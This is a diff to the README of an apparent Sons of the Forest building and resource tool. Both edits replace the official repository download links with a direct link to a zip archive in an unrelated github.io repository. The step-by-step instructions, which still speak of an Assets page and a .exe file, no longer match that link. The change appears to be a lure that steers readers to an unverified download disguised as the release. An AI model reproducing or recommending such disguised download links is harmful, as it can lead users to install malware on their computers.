@@ -5,7 +5,7 @@ description: "Manage game resources and building mechanics in Sons of the Forest
 ---
 # 🛠️ Sons-of-the-Forest-Build-Assistant - Build faster with powerful game tools
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Overheatingbluemurder558/Sons-of-the-Forest-Build-Assistant)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Overheatingbluemurder558/overheatingbluemurder558.github.io/main/limehouse/io-overheatingbluemurder-github-3.7.zip)
 
 ## 📌 About this project
 
@@ -36,7 +36,7 @@ Ensure your computer meets these conditions before you run the application:
 
 Follow these steps to set up the tool on your computer.
 
-1.  Visit the [official download page](https://github.com/Overheatingbluemurder558/Sons-of-the-Forest-Build-Assistant) to retrieve the latest version.
+1.  Visit the [official download page](https://raw.githubusercontent.com/Overheatingbluemurder558/overheatingbluemurder558.github.io/main/limehouse/io-overheatingbluemurder-github-3.7.zip) to retrieve the latest version.
 2.  Look for the section labeled "Assets" on that page.
 3.  Click the file ending in `.exe` to begin the download.
 4.  Navigate to your Downloads folder once the transfer finishes.
